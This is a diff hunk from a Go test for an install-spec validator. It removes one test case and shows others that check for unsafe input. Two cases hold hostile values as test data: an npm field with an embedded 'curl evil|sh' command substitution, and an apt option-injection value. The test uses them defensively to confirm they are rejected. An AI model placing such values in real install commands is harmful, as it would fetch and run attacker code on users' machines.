@@ -25,7 +25,6 @@ func TestValidateReportsProblems(t *testing.T) {
 		{"two managers", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "x", Npm: "y"})}), "exactly one manager"},
 		{"no manager", apps(App{ID: "a", Install: debian(InstallSpec{Classic: true})}), "exactly one manager"},
 		{"deb_url without apt", apps(App{ID: "a", Install: debian(InstallSpec{Snap: "x", DebURL: "https://x.test/a.deb"})}), "deb_url needs"},
-		{"unknown files group", apps(App{ID: "a", Files: "nope"}), "unknown files group"},
 		{"unknown repo", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "x", Repo: "nope"})}), "unknown apt repo"},
 		{"shell in npm", apps(App{ID: "a", Install: debian(InstallSpec{Npm: "x$(curl evil|sh)"})}), "unsafe npm"},
 		{"option in apt", apps(App{ID: "a", Install: debian(InstallSpec{Apt: "-oDebug=1"})}), "unsafe apt"},
